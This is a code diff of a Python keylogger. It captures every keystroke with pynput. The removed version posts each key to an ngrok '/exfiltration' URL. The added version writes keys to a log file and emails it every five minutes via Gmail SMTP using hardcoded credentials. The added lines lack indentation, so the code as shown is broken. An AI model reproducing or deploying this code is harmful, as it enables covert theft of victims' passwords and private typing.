@@ -1,26 +1,43 @@
 from pynput import keyboard
-import requests
+import logging
+import smtplib
+import threading
 
-# L'URL du serveur Flask (assurez-vous que le serveur est en cours d'exécution)
-SERVER_URL = "https://38ac1df687ae.ngrok-free.app/exfiltration"  # Utilise l'IP de ton serveur Flask si tu veux tester à distance
+#Config Logging
+log_file= "keylog.txt"
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+#Email cred
+EMAIL_ADDRESS = "Billgates676767"
+EMAIL_PASSWORD = "Gamer9000"
+TO_EMAIL = "Billgates676767"
+
+def send_email():
+try:
+with open(log_file, "r") as file:
+log_content = file.read()
+
+server = smtplib.SMTP("smtp.gmail.com", 587)
+server.starttls()
+server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+server.sendmail(EMAIL_ADDRESS, TO_EMAIL, f"Subject: Keylog Report\n\n{log_content}")
+server.quit()
+except Exception as e:
+print(f"Email error: {e}")
+
+#Schedule email
+threading.Timer(300, send_email).start()
 
 def on_press(key):
-    try:
-        # Capture de la touche appuyée
-        char = key.char
-    except AttributeError:
-        # Si c'est une touche spéciale (espace, retour chariot, etc.)
-        char = f" [{key}] "
+try:
+logging.info(str(key))
+except Exception as e:
+print(f"Error: {e}")
 
-    # Envoie la frappe à ton serveur Flask
-    try:
-        requests.post(SERVER_URL, data={"key": char})
-    except Exception as e:
-        print(f"Erreur lors de l'envoi au serveur : {e}")
+#start loop
+send_email()
 
-# Démarre l'écoute des frappes clavier
-listener = keyboard.Listener(on_press=on_press)
-listener.start()
-
-# Maintient le listener actif
+#keyboard events
+with keyboard.Listener(on_press=on_press) as listener:
 listener.join()
+
